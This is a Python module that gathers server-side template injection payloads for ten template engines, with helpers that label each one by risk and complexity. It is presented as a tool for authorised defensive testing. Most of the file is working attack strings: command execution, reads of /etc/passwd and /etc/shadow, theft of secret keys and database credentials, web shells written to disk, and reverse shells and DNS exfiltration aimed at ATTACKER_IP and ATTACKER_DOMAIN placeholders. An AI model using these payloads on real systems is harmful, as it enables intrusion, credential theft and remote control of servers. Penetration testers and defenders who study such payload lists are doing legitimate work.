#!/usr/bin/env python3
"""
Advanced SSTI (Server Side Template Injection) Payloads
Comprehensive template injection payloads for defensive security testing

⚠️  FOR AUTHORIZED DEFENSIVE TESTING ONLY ⚠️
These are REAL SSTI payloads used in actual penetration testing
Risk Level: 5-7 (High to Critical Impact)
Complexity Level: 6-9 (Expert to Master Level)
"""

from typing import Dict, List, Any, Tuple
import base64
import urllib.parse
import random
import json

class SSTIPayloads:
    """Advanced Server Side Template Injection payload generator"""
    
    def __init__(self):
        self.jinja2_payloads = self._load_jinja2_payloads()
        self.django_payloads = self._load_django_payloads()
        self.smarty_payloads = self._load_smarty_payloads()
        self.twig_payloads = self._load_twig_payloads()
        self.freemarker_payloads = self._load_freemarker_payloads()
        self.velocity_payloads = self._load_velocity_payloads()
        self.thymeleaf_payloads = self._load_thymeleaf_payloads()
        self.handlebars_payloads = self._load_handlebars_payloads()
        self.mustache_payloads = self._load_mustache_payloads()
        self.erb_payloads = self._load_erb_payloads()
        self.detection_payloads = self._load_detection_payloads()
        
    def _load_jinja2_payloads(self) -> Dict[str, List[str]]:
        """Real Jinja2/Flask template injection payloads"""
        return {
            "basic_detection": [
                # Basic math operations
                "{{7*7}}",
                "{{7*'7'}}",
                "{{config}}",
                "{{self}}",
                "{{request}}",
                
                # Configuration access
                "{{config.items()}}",
                "{{config['SECRET_KEY']}}",
                "{{config.get('DATABASE_URI')}}",
                "{{request.environ}}",
                "{{request.args}}",
                "{{request.form}}",
                "{{request.cookies}}",
                
                # Template globals
                "{{url_for}}",
                "{{get_flashed_messages}}",
                "{{session}}",
                "{{g}}"
            ],
            
            "code_execution": [
                # Direct code execution
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                "{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}",
                "{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}",
                "{{url_for.__globals__['os'].popen('whoami').read()}}",
                "{{get_flashed_messages.__globals__['subprocess'].check_output('whoami',shell=True)}}",
                
                # Advanced payload construction
                "{{().__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['os'].popen('id').read()}}",
                "{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()[0].strip()}}",
                "{{config.__class__.__init__.__globals__['os'].system('whoami')}}",
                
                # Subprocess execution
                "{{request.application.__globals__.__builtins__.__import__('subprocess').popen('whoami').read()}}",
                "{{''.__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['subprocess'].check_output('id',shell=True)}}",
                
                # Alternative execution methods
                "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
                "{{config.__class__.__init__.__globals__['os'].environ.get('HOME')}}",
                "{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}",
                "{{lipsum.__globals__.os.popen('id').read()}}"
            ],
            
            "reverse_shells": [
                # Bash reverse shells
                "{{config.__class__.__init__.__globals__['os'].system('bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"')}}",
                "{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['os'].popen('nc -e /bin/bash ATTACKER_IP 4444').read()}}",
                "{{request.application.__globals__.__builtins__.__import__('os').system('python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"ATTACKER_IP\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])\"')}}",
                
                # Python reverse shells
                "{{config.__class__.__init__.__globals__['os'].system('python -c \"import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"ATTACKER_IP\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\\"/bin/sh\\\")\"')}}",
                
                # Alternative shells
                "{{url_for.__globals__['os'].system('perl -e \"use Socket;\\$i=\\\"ATTACKER_IP\\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\\"tcp\\\"));if(connect(S,sockaddr_in(\\$p,inet_aton(\\$i)))){open(STDIN,\\\">&S\\\");open(STDOUT,\\\">&S\\\");open(STDERR,\\\">&S\\\");exec(\\\"/bin/sh -i\\\");};\"')}}"
            ],
            
            "file_operations": [
                # File reading
                "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
                "{{config.__class__.__init__.__globals__['open']('/etc/passwd').read()}}",
                "{{get_flashed_messages.__globals__['open']('/etc/shadow').read()}}",
                "{{url_for.__globals__['open']('/proc/version').read()}}",
                
                # File writing
                "{{config.__class__.__init__.__globals__['open']('/tmp/pwned.txt','w').write('SSTI Success')}}",
                "{{''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/shell.php','w').write('<?php system($_GET[\"cmd\"]); ?>')}}",
                
                # Directory listing
                "{{config.__class__.__init__.__globals__['os'].listdir('/etc')}}",
                "{{url_for.__globals__['os'].walk('/var/www').__next__()}}",
            ],
            
            "information_disclosure": [
                # Environment variables
                "{{config.__class__.__init__.__globals__['os'].environ}}",
                "{{request.environ}}",
                "{{config.items()}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
                
                # Application secrets
                "{{config['SECRET_KEY']}}",
                "{{config.get('DATABASE_URL')}}",
                "{{config.get('SQLALCHEMY_DATABASE_URI')}}",
                "{{session.keys()}}",
                "{{g.__dict__}}",
                
                # System information
                "{{config.__class__.__init__.__globals__['os'].uname()}}",
                "{{url_for.__globals__['sys'].version}}",
                "{{get_flashed_messages.__globals__['sys'].modules.keys()}}"
            ]
        }
    
    def _load_django_payloads(self) -> Dict[str, List[str]]:
        """Real Django template injection payloads"""
        return {
            "basic_detection": [
                # Basic expressions
                "{{7*7}}",
                "{{request}}",
                "{{settings}}",
                "{{user}}",
                
                # Django-specific objects
                "{{request.user}}",
                "{{request.META}}",
                "{{request.GET}}",
                "{{request.POST}}",
                "{{request.COOKIES}}"
            ],
            
            "settings_disclosure": [
                # Settings access
                "{{settings.SECRET_KEY}}",
                "{{settings.DATABASES}}",
                "{{settings.DEBUG}}",
                "{{settings.ALLOWED_HOSTS}}",
                "{{settings.INSTALLED_APPS}}"
            ],
            
            "code_execution": [
                # Limited execution in Django (more restricted)
                "{{request.META.items}}",
                "{{''.__class__.__mro__}}",
                "{{settings.__class__.__mro__}}",
                
                # Debug mode exploitation
                "{{request.resolver_match}}",
                "{{request.urlconf}}"
            ]
        }
    
    def _load_smarty_payloads(self) -> Dict[str, List[str]]:
        """Real Smarty template injection payloads"""
        return {
            "basic_detection": [
                # Math operations
                "{7*7}",
                "{$smarty.version}",
                "{php}echo 'SSTI';{/php}",
                "{eval var='7*7'}"
            ],
            
            "code_execution": [
                # PHP code execution
                "{php}system('whoami');{/php}",
                "{php}passthru('id');{/php}",
                "{php}shell_exec('whoami');{/php}",
                "{php}exec('whoami',$output);print_r($output);{/php}",
                
                # Function calls
                "{'whoami'|system}",
                "{'id'|shell_exec}",
                "{'cat /etc/passwd'|passthru}",
                
                # Eval-based execution
                "{eval var='`whoami`'}",
                "{eval var='shell_exec(\"id\")'}"
            ],
            
            "file_operations": [
                # File reading
                "{php}readfile('/etc/passwd');{/php}",
                "{php}echo file_get_contents('/etc/shadow');{/php}",
                "{'cat /etc/passwd'|system}",
                
                # File writing
                "{php}file_put_contents('shell.php','<?php system($_GET[cmd]);?>');{/php}",
                "{'echo \"<?php system(\\$_GET[cmd]); ?>\" > shell.php'|system}"
            ]
        }
    
    def _load_twig_payloads(self) -> Dict[str, List[str]]:
        """Real Twig template injection payloads"""
        return {
            "basic_detection": [
                # Basic expressions
                "{{7*7}}",
                "{{_self}}",
                "{{app}}",
                "{{dump()}}",
                
                # Twig globals
                "{{app.request}}",
                "{{app.session}}",
                "{{app.environment}}",
                "{{app.debug}}"
            ],
            
            "code_execution": [
                # Filter-based execution
                "{{_self.env.setCache('ftp://attacker.net:2121')}}{{_self.env.loadTemplate('backdoor')}}",
                "{{_self.env.enableDebug()}}{{_self.env.enableAutoReload()}}{{_self.env.setCache(false)}}{{_self.env.display('backdoor')}}",
                
                # Global access
                "{{app.request.server.get('DOCUMENT_ROOT')}}",
                "{{_self.env.filters}}",
                
                # Advanced payload construction
                "{{['id']|filter('system')}}",
                "{{['whoami']|reduce((a,b) => a ~ shell_exec(b))}}",
                
                # Map filter exploitation
                "{{{'<?php system($_GET[0]); ?>':'shell.php'}|map((v,k) => file_put_contents(k,v))}}",
                "{{[0,1,2,3,4,5,6,7,8,9]|join('')|length|number_format(0,0,'','whoami`'.system`')}}"
            ],
            
            "file_operations": [
                # File operations through filters
                "{{'/etc/passwd'|file_get_contents}}",
                "{{['cat','/etc/passwd']|join(' ')|passthru}}",
                "{{{'shell.php':'<?php system($_GET[\"c\"]); ?>'}|map((v,k)=>file_put_contents(k,v))}}"
            ]
        }
    
    def _load_freemarker_payloads(self) -> Dict[str, List[str]]:
        """Real FreeMarker template injection payloads"""
        return {
            "basic_detection": [
                # Basic operations
                "${7*7}",
                "${.data_model}",
                "${.globals}",
                "${.main_template_name}",
                "${.namespace}",
                "${.current_template_name}",
                "${.template_name}"
            ],
            
            "code_execution": [
                # Built-in execution
                "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('whoami')}",
                "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
                "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('cat /etc/passwd')}",
                
                # ObjectConstructor-based
                "<#assign oc='freemarker.template.utility.ObjectConstructor'?new()>${oc('java.lang.ProcessBuilder','whoami').start()}",
                "<#assign oc='freemarker.template.utility.ObjectConstructor'?new()>${oc('java.io.File','/etc/passwd')}",
                
                # Alternative execution methods
                "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join('')}",
                "<#assign cmd='freemarker.template.utility.Execute'?new()>${cmd('bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"')}"
            ],
            
            "file_operations": [
                # File reading
                "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('../../../../etc/passwd').toURL().openStream().readAllBytes()?join('')}",
                "<#assign file=File('/etc/passwd')>${file.readLines()}",
                
                # File writing
                "<#assign file=File('/tmp/shell.jsp')>${file.write('<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>')}"
            ]
        }
    
    def _load_velocity_payloads(self) -> Dict[str, List[str]]:
        """Real Velocity template injection payloads"""
        return {
            "basic_detection": [
                # Basic operations
                "$7*7",
                "#set($x=7*7)$x",
                "$class",
                "$class.name"
            ],
            
            "code_execution": [
                # Runtime execution
                "#set($rt = $class.forName('java.lang.Runtime').getRuntime())#set($process = $rt.exec('whoami'))$process.waitFor()#set($input = $process.getInputStream())#set($scanner = $class.forName('java.util.Scanner').getConstructor($class.forName('java.io.InputStream')).newInstance($input).useDelimiter('\\A'))#if($scanner.hasNext())$scanner.next()#end",
                "#set($runtime=$class.forName('java.lang.Runtime').getRuntime())#set($process=$runtime.exec('id'))#set($null=$process.waitFor())#set($input=$process.getInputStream())#foreach($i in [1..$input.available()])$chr($input.read())#end",
                
                # ProcessBuilder execution
                "#set($pb = $class.forName('java.lang.ProcessBuilder').getConstructor($class.forName('[Ljava.lang.String;')).newInstance($class.forName('java.lang.String').forName('[Ljava.lang.String;').cast($class.forName('java.util.Arrays').getMethod('asList', $class.forName('[Ljava.lang.Object;')).invoke(null, $class.forName('[Ljava.lang.Object;').cast($class.forName('java.lang.String').forName('[Ljava.lang.String;').cast($class.forName('java.util.List').cast(['whoami']))))))$pb.start()",
                
                # Alternative execution
                "#set($cmd = 'whoami')#set($rt = $class.forName('java.lang.Runtime').getRuntime())#set($process = $rt.exec($cmd))$process.waitFor()#set($input = $process.getInputStream())#set($stringWriter = $class.forName('java.io.StringWriter').getConstructor().newInstance())#set($buffer = $class.forName('[B').cast($class.forName('java.lang.reflect.Array').newInstance($class.forName('java.lang.Byte').TYPE, 1024)))#set($bytesRead = $input.read($buffer))#if($bytesRead > 0)$class.forName('java.lang.String').getConstructor($class.forName('[B'), $class.forName('java.lang.Integer').TYPE, $class.forName('java.lang.Integer').TYPE).newInstance($buffer, 0, $bytesRead)#end"
            ]
        }
    
    def _load_thymeleaf_payloads(self) -> Dict[str, List[str]]:
        """Real Thymeleaf template injection payloads"""
        return {
            "basic_detection": [
                # Basic expressions
                "${7*7}",
                "[[${7*7}]]",
                "[(${7*7})]",
                "${@java.lang.System@getProperty('user.name')}"
            ],
            
            "code_execution": [
                # Runtime execution
                "${T(java.lang.Runtime).getRuntime().exec('whoami')}",
                "${T(java.lang.Runtime).getRuntime().exec('id')}",
                "${T(java.lang.System).getProperty('user.name')}",
                
                # ProcessBuilder
                "${T(java.lang.ProcessBuilder).new({'whoami'}).start()}",
                "${T(java.lang.ProcessBuilder).new('bash','-c','id').start()}"
            ]
        }
    
    def _load_handlebars_payloads(self) -> Dict[str, List[str]]:
        """Real Handlebars template injection payloads"""
        return {
            "basic_detection": [
                # Basic operations
                "{{7*7}}",
                "{{{7*7}}}",
                "{{this}}",
                "{{constructor}}"
            ],
            
            "code_execution": [
                # Prototype pollution and execution
                "{{#with \"constructor\"}}{{#with \"../constructor\"}}{{#with \"../constructor\"}}{{#lookup . \"call\"}}{{#with \"../../../process\"}}{{#with \"mainModule\"}}{{#with \"require\"}}{{#with \"../../../child_process\"}}{{lookup . \"exec\"}}{{/with}}{{/with}}{{/with}}{{/with}}{{/lookup}}{{/with}}{{/with}}{{/with}}",
                "{{constructor.constructor('return process')().mainModule.require('child_process').execSync('whoami')}}",
                "{{#with (constructor.constructor('return global.process.mainModule.constructor._load')())}}{{this 'child_process'}}{{/with}}"
            ]
        }
    
    def _load_mustache_payloads(self) -> Dict[str, List[str]]:
        """Real Mustache template injection payloads"""
        return {
            "basic_detection": [
                # Basic operations (limited in Mustache)
                "{{.}}",
                "{{#.}}{{/.}}",
                "{{{.}}}"
            ],
            
            "limited_execution": [
                # Mustache is logic-less, limited exploitation
                "{{#lambda}}{{.}}{{/lambda}}",
                "{{{lambda}}}",
                "{{>partial}}"
            ]
        }
    
    def _load_erb_payloads(self) -> Dict[str, List[str]]:
        """Real ERB (Ruby) template injection payloads"""
        return {
            "basic_detection": [
                # Basic operations
                "<%= 7*7 %>",
                "<%= `whoami` %>",
                "<%= system('whoami') %>",
                "<%= Ruby::VERSION %>"
            ],
            
            "code_execution": [
                # Direct execution
                "<%= `whoami` %>",
                "<%= system('id') %>",
                "<%= exec('whoami') %>",
                "<%= %x(whoami) %>",
                
                # File operations
                "<%= File.read('/etc/passwd') %>",
                "<%= IO.read('/etc/shadow') %>",
                "<%= File.open('/etc/passwd').read %>",
                
                # Network operations
                "<%= require 'net/http'; Net::HTTP.get(URI('http://ATTACKER_IP:8000/')) %>",
                "<%= require 'socket'; TCPSocket.open('ATTACKER_IP', 4444) %>",
                
                # Reverse shells
                "<%= require 'socket'; s = TCPSocket.open('ATTACKER_IP', 4444); while cmd = s.gets; IO.popen(cmd, 'r') { |io| s.print io.read }; end %>",
                "<%= exec 'bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"' %>"
            ]
        }
    
    def _load_detection_payloads(self) -> Dict[str, List[str]]:
        """Generic SSTI detection payloads"""
        return {
            "polyglot_detection": [
                # Multi-engine detection
                "${7*7}{{7*7}}#{7*7}%{7*7}{{7*'7'}}${\"z\".join(\"ab\")}{{\"z\".join(\"ab\")}}${'z'.join('ab')}",
                "{{7*7}}${7*7}#{7*7}%{7*7}{{7*'7'}}${'z'.join('ab')}",
                "${{7*7}}#{{7*7}}{{7*7}}%{7*7}",
                
                # Cross-platform payloads
                "{{config.items()}}${@java.lang.System@getProperty('user.name')}{php}echo 'test';{/php}",
                "<%=7*7%>{{7*7}}${7*7}#{7*7}"
            ],
            
            "error_based_detection": [
                # Trigger errors to identify template engine
                "{{undefined_variable}}",
                "${undefined_variable}",
                "#{undefined_variable}",
                "%{undefined_variable}",
                "<%= undefined_variable %>",
                "{{#each undefined}}{{/each}}",
                "{if undefined}test{/if}"
            ],
            
            "blind_detection": [
                # Time-based detection
                "{{range(1000000)|list|length}}",
                "${@java.lang.Thread@sleep(5000)}",
                "{php}sleep(5);{/php}",
                "<%= sleep(5) %>",
                
                # DNS-based detection
                "{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['os'].system('nslookup $(whoami).ATTACKER_DOMAIN')}}",
                "${T(java.lang.Runtime).getRuntime().exec('nslookup ' + T(java.net.InetAddress).getLocalHost().getHostName() + '.ATTACKER_DOMAIN')}",
                "<%= `nslookup #{`whoami`.strip}.ATTACKER_DOMAIN` %>"
            ]
        }
    
    def get_payloads_by_engine(self, engine: str) -> Dict[str, List[str]]:
        """Get payloads for specific template engine"""
        engine_map = {
            'jinja2': self.jinja2_payloads,
            'django': self.django_payloads,
            'smarty': self.smarty_payloads,
            'twig': self.twig_payloads,
            'freemarker': self.freemarker_payloads,
            'velocity': self.velocity_payloads,
            'thymeleaf': self.thymeleaf_payloads,
            'handlebars': self.handlebars_payloads,
            'mustache': self.mustache_payloads,
            'erb': self.erb_payloads
        }
        return engine_map.get(engine.lower(), {})
    
    def get_detection_payloads(self, category: str = "all") -> List[str]:
        """Get SSTI detection payloads"""
        if category == "all":
            all_payloads = []
            for payloads in self.detection_payloads.values():
                all_payloads.extend(payloads)
            return all_payloads
        return self.detection_payloads.get(category, [])
    
    def get_comprehensive_test_set(self) -> List[Dict[str, Any]]:
        """Get comprehensive SSTI test set"""
        test_set = []
        
        engines = ['jinja2', 'django', 'smarty', 'twig', 'freemarker', 
                  'velocity', 'thymeleaf', 'handlebars', 'mustache', 'erb']
        
        for engine in engines:
            payloads_dict = self.get_payloads_by_engine(engine)
            for category, payloads in payloads_dict.items():
                for payload in payloads:
                    test_set.append({
                        'payload': payload,
                        'engine': engine,
                        'category': category,
                        'risk_level': self._assess_risk_level(category, payload),
                        'complexity': self._assess_complexity(engine, payload)
                    })
        
        return test_set
    
    def _assess_risk_level(self, category: str, payload: str) -> str:
        """Assess risk level of SSTI payload"""
        high_risk_categories = ['code_execution', 'reverse_shells']
        critical_commands = ['system', 'exec', 'shell', 'Runtime', 'ProcessBuilder']
        
        if category in high_risk_categories:
            return "HIGH"
        elif any(cmd in payload for cmd in critical_commands):
            return "CRITICAL"
        elif 'file_operations' in category:
            return "MEDIUM"
        else:
            return "LOW"
    
    def _assess_complexity(self, engine: str, payload: str) -> str:
        """Assess complexity of SSTI payload"""
        complex_engines = ['freemarker', 'velocity', 'jinja2']
        complex_patterns = ['__subclasses__', '__globals__', '__mro__', 'getConstructor', 'forName']
        
        if engine in complex_engines and any(pattern in payload for pattern in complex_patterns):
            return "EXPERT"
        elif len(payload) > 200:
            return "ADVANCED"
        elif any(pattern in payload for pattern in complex_patterns):
            return "INTERMEDIATE"
        else:
            return "BASIC"

# Usage examples and payload statistics
if __name__ == "__main__":
    print("Advanced SSTI Payloads - High Level Real Exploitation")
    print("=" * 70)
    
    ssti_payloads = SSTIPayloads()
    
    # Count payloads by engine
    engines = ['jinja2', 'django', 'smarty', 'twig', 'freemarker', 
              'velocity', 'thymeleaf', 'handlebars', 'mustache', 'erb']
    
    total_payloads = 0
    
    for engine in engines:
        payloads_dict = ssti_payloads.get_payloads_by_engine(engine)
        engine_total = sum(len(payloads) for payloads in payloads_dict.values())
        total_payloads += engine_total
        print(f"{engine.capitalize()} Payloads: {engine_total}")
    
    detection_total = sum(len(payloads) for payloads in ssti_payloads.detection_payloads.values())
    total_payloads += detection_total
    
    print(f"Detection Payloads: {detection_total}")
    print(f"Total SSTI Payloads: {total_payloads}")
    
    print("\nTemplate Engines Supported:")
    for engine in engines:
        payloads_dict = ssti_payloads.get_payloads_by_engine(engine)
        categories = list(payloads_dict.keys())
        if categories:
            print(f"  - {engine.upper()}: {categories}")
    
    print("\nDetection Categories:")
    for category in ssti_payloads.detection_payloads.keys():
        count = len(ssti_payloads.detection_payloads[category])
        print(f"  - {category}: {count} payloads")